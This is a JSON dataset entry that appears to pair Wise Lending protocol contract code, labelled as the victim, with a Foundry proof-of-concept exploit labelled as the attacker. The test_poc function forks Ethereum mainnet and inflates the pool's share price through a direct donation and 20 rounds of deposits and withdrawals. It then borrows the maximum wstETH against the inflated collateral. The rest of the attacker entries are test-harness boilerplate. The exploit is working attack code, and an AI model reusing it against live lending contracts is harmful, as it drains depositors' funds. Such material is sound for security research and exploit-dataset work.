[
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "borrowExactAmount",
    "original_code": "    function borrowExactAmount(\n        uint256 _nftId,\n        address _underlyingAsset,\n        uint256 _borrowAmount\n    )\n        external\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "depositExactAmount",
    "original_code": "    function depositExactAmount(\n        uint256 _nftId,\n        address _underlyingAsset,\n        uint256 _amount\n    )\n        external\n        returns (uint256);\n\n    function depositExactAmountETH(\n        uint256 _nftId\n    )\n        external\n        payable\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "getPositionLendingShares",
    "original_code": "    function getPositionLendingShares(\n        uint256 _nftId,\n        address _poolToken\n    )\n        external\n        view\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "lendingPoolData",
    "original_code": "    function lendingPoolData(\n        address _poolToken\n    )\n        external\n        view\n        returns (LendingPoolEntry memory);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "withdrawExactAmount",
    "original_code": "    function withdrawExactAmount(\n        uint256 _nftId,\n        address _token,\n        uint256 _amount\n    )\n        external\n        returns (uint256);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "withdrawExactShares",
    "original_code": "    function withdrawExactShares(\n        uint256 _nftId,\n        address _underlyingAsset,\n        uint256 _shares\n    )\n        external\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseSecurity",
    "source_type": "victim_contract",
    "function_name": "maximumBorrowToken",
    "original_code": "    function maximumBorrowToken(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _interval\n    )\n        external\n        view\n        returns (uint256 tokenAmount)\n    {\n        uint256 term = _overallETHCollateralsWeighted(_nftId, _interval)\n            * borrowPercentageCap\n            / PRECISION_FACTOR_E18;\n\n        uint256 borrowETH = term\n            - _overallETHBorrow(\n                _nftId,\n                _interval\n            );\n\n        tokenAmount = WISE_ORACLE.getTokensFromETH(\n            _poolToken,\n            borrowETH\n        );\n\n        uint256 maxPoolAmount = WISE_LENDING.getTotalPool(\n            _poolToken\n        );\n\n        if (tokenAmount > maxPoolAmount) {\n            tokenAmount = maxPoolAmount;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Oracle",
    "source_type": "victim_contract",
    "function_name": "getRoundData",
    "original_code": "    function getRoundData(\n        uint80 _roundId\n    )\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        )\n    {\n        (\n            roundId,\n            answer,\n            startedAt,\n            updatedAt,\n            answeredInRound\n\n        ) = ST_ETH_FEED.getRoundData(\n            _roundId\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Oracle",
    "source_type": "victim_contract",
    "function_name": "latestRoundData",
    "original_code": "    function latestRoundData()\n        public\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        )\n    {\n        answer = int256(\n            latestAnswer()\n        );\n\n        (\n            roundId,\n            ,\n            startedAt,\n            updatedAt,\n            answeredInRound\n\n        ) = ST_ETH_FEED.latestRoundData();\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "NFTManager",
    "source_type": "victim_contract",
    "function_name": "mintPosition",
    "original_code": "    function mintPosition()\n        external\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "nft",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blockNumber);\n\n        vm.label(address(wiseLending), \"wiseLending\");\n        vm.label(address(poolToken), \"poolToken\");\n        vm.label(address(pendleLPT), \"pendleLPT\");\n        vm.label(address(other), \"other\");\n        vm.label(wsteth, \"wsteth\");\n        vm.label(wstethOracle, \"wstethOracle\");\n        vm.label(wiseSecurity, \"wiseSecurity\");\n        other = vm.addr(123_123);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "test_poc",
    "original_code": "    function test_poc() public {\n        deal(pendleLPT, address(this), 1 ether);\n\n        IERC20(pendleLPT).approve(poolToken, MAX);\n\n        Pool(poolToken).depositExactAmount(1 ether);\n\n        IERC20(poolToken).approve(address(wiseLending), MAX);\n\n        uint256 nftId = nft.mintPosition();\n\n        wiseLending.depositExactAmount(nftId, poolToken, 1e9);\n\n        IERC20(poolToken).transfer(address(wiseLending), 1e9);\n\n        (uint256 pseudoTotalPool, uint256 totalDepositShares,) = wiseLending.lendingPoolData(poolToken);\n\n        skip(5 seconds);\n\n        uint256 share = wiseLending.getPositionLendingShares(nftId, poolToken);\n\n        // withdraw all shares\n        wiseLending.withdrawExactShares(nftId, poolToken, share);\n\n        uint256 i = 0;\n        do {\n            (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);\n            share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);\n\n            wiseLending.withdrawExactAmount(nftId, poolToken, share);\n            ++i;\n        } while (i < 20);\n\n        (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);\n        share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);\n        (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);\n\n        IERC20(poolToken).transfer(other, IERC20(poolToken).balanceOf(address(this)));\n        vm.startPrank(other);\n        nftId = nft.mintPosition();\n        IERC20(poolToken).approve(address(wiseLending), MAX);\n\n        wiseLending.depositExactAmount(nftId, poolToken, IERC20(poolToken).balanceOf(other));\n\n        uint256 amount = IWiseSecurity(wiseSecurity).maximumBorrowToken(nftId, poolToken, 0);\n\n        wiseLending.borrowExactAmount(nftId, wsteth, amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "WiseLendingTest",
    "source_type": "attacker_contract",
    "function_name": "wiseLending",
    "original_code": "",
    "description": ""
  }
]